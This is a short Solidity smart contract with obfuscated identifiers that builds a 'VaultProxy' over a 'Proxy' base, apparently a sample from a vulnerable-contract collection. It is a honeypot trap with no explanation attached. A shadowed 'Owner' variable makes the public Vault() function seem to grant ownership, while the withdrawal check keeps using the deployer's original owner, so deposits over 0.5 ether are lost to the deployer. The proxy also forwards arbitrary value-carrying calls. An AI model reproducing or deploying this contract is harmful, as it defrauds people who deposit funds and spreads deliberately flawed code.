// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x5570eb { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x959e4c(address _0x83a82d) public _0x5570eb { Owner = _0x83a82d; }
    function _0xc293a4(address _0xc5eead, bytes data) public payable {
        _0xc5eead.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0x8ae13c();
        }
    }

    function _0x8ae13c() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x92bb2a(uint256 _0x740acc) public _0x5570eb {
        if (_0x740acc>0 && Deposits[msg.sender]>=_0x740acc) {
            msg.sender.transfer(_0x740acc);
        }
    }
}